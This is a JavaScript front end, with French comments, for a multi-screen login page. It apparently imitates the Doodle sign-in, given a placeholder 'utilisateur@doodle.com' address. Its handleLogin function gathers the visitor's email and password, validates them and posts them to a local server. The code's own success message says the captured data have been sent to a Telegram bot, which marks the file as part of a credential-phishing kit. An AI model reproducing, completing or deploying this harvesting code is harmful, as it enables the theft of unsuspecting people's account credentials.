// Configuration du serveur
const SERVER_URL = 'http://localhost:3000';

// Navigation entre les écrans
function goToScreen(screenNumber) {
    // Masquer tous les écrans
    document.querySelectorAll('.screen').forEach(screen => {
        screen.style.display = 'none';
    });

    // Afficher l'écran cible
    const targetScreen = document.getElementById(`screen${screenNumber}`);
    if (targetScreen) {
        targetScreen.style.display = 'block';
    }
}

// Afficher/masquer le mot de passe
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('showPassword');

    if (showPasswordCheckbox.checked) {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }
}

// Envoyer les données de connexion au serveur
async function handleLogin() {
    const email = document.getElementById('email').value || document.getElementById('email2').value;
    const password = document.getElementById('password').value;

    // Validation
    if (!email || !password) {
        alert('Veuillez remplir tous les champs');
        return;
    }

    if (!validateEmail(email)) {
        alert('Veuillez entrer une adresse email valide');
        return;
    }

    if (!validatePassword(password)) {
        alert('Le mot de passe doit contenir au moins 6 caractères');
        return;
    }

    // Afficher un message de chargement
    const button = event.target;
    const originalText = button.textContent;
    button.textContent = 'Connexion en cours...';
    button.disabled = true;

    try {
        // Envoyer les données au serveur
        const response = await fetch(`${SERVER_URL}/api/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        const data = await response.json();

        if (data.success) {
            console.log('✅ Données envoyées avec succès!');
            alert('✅ Connexion réussie!\n\nLes données ont été envoyées au bot Telegram.');
            // Réinitialiser le formulaire
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('showPassword').checked = false;
            goToScreen(3);
        } else {
            alert('❌ Erreur: ' + data.message);
        }
    } catch (error) {
        console.error('Erreur de connexion:', error);
        alert('❌ Erreur de connexion au serveur. Assurez-vous que le serveur est en cours d\'exécution.');
    } finally {
        button.textContent = originalText;
        button.disabled = false;
    }
}

// Initialisation au chargement de la page
document.addEventListener('DOMContentLoaded', function() {
    // Remplir les emails sur les écrans suivants
    const emailInputScreen3 = document.getElementById('email');
    const email1 = document.getElementById('email1');
    const email2 = document.getElementById('email2');

    if (emailInputScreen3) {
        emailInputScreen3.addEventListener('input', function() {
            email1.textContent = this.value || 'utilisateur@doodle.com';
            email2.textContent = this.value || 'utilisateur@doodle.com';
        });
    }

    // Permettre la navigation avec Entrée
    document.addEventListener('keypress', function(event) {
        if (event.key === 'Enter') {
            const activeScreen = document.querySelector('.screen[style="display: block"]');
            const button = activeScreen ? activeScreen.querySelector('.btn') : null;
            if (button) {
                // Si c'est l'écran 2 (mot de passe), envoyer les données
                if (activeScreen.id === 'screen2') {
                    handleLogin();
                } else {
                    button.click();
                }
            }
        }
    });

    // Tester la connexion au serveur
    console.log('🔄 Vérification de la connexion au serveur...');
    fetch(`${SERVER_URL}/api/test`)
        .then(res => res.json())
        .then(data => console.log('✅ Serveur prêt:', data))
        .catch(err => console.warn('⚠️ Serveur non accessible (démarrez: npm start)'));
});

// Validation email
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Validation mot de passe
function validatePassword(password) {
    return password.length >= 6;
}